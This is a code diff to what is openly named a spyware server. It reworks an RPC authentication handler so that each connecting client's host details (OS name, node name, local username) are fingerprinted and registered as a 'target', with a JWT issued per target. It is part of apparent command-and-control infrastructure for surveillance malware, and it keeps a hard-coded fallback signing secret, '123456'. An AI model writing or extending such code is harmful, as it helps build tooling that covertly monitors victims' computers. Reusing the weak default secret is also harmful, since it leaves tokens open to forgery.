@@ -6,6 +6,7 @@ from spyware_server_common.utils import checkHash, sha256
 from spyware_server_common.config import get_config
 
 from ..models.access import get_access_by_username
+from ..models.target import generate_get_create
 
 
 def validate_authentication_message (data) :
@@ -50,9 +51,11 @@ def generateFingerPrint (info) :
     return sha256("$".join(dataStr))
 
 def create_authentication_callback (cursor) :
+    config = get_config()
+    get_or_create_target = generate_get_create(cursor)
+
     def callback (ch, method, properties, body) :
         data = None
-        config = get_config()
 
         try :
             data = json.loads(body.decode())
@@ -66,6 +69,7 @@ def create_authentication_callback (cursor) :
 
         username = data['username']
         password = data['password']
+        info = data.get('info', {})
 
         access_data = get_access_by_username(cursor, username)
 
@@ -73,9 +77,14 @@ def create_authentication_callback (cursor) :
             send_rpc_error_reply(ch, method, properties, 'invalid_credentials')
             return
 
-        fp = generateFingerPrint(data.get("info", {}))
-        print(fp)
-        token = jwt.encode({'username': username}, config.get('secrect', '123456'))
+        fp = generateFingerPrint(info)
+        target = get_or_create_target(fp, info.get('os_name'), info.get('nodename'), info.get('username'))
+
+        if target is None :
+            send_rpc_error_reply(ch, method, properties, 'invalid_info')
+            return
+
+        token = jwt.encode({'fp': fp}, config.get('secrect', '123456'))
         return_payload = json.dumps({ 'token': token })
         send_rpc_reply (ch, method, properties, return_payload)
 
